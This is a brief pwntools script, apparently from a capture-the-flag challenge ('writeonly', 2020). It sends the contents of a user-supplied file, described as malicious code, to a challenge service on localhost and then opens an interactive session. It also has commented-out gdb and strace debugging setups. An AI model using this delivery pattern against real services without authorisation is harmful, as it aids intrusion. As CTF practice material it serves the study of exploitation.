import os
import sys
from pwn import *

context.terminal = ['./nvimterm']
f = sys.argv[1]
fd = open(f, 'rb')
stat = os.stat(f)
sz = stat.st_size

# io = gdb.debug('./chal', gdbscript="""
# #break *0x402354
# # command 1
# # si
# # XXX: these breakpoint adds don't actually work and I don't know why
# # break *$pc + 0x83
# # break *$pc + 0x94
# # break *$pc + 0xdc
# # break *$pc + 0x2bc
# # end
#
# #break *(nanosleep+15)
# set detach-on-fork off
# #set follow-fork-mode child
# """)

# io = process(executable='/usr/bin/strace', argv=['-ff', '-o', 'wtf', '--', './chal'])
# io = remote('writeonly.2020.ctfcompetition.com', 1337)

# for `make serve`
io = remote('localhost', 8000)

# you can gdb into the parent before we send malicious code
input()
io.sendline(str(sz))
io.send(fd.read())
io.interactive()

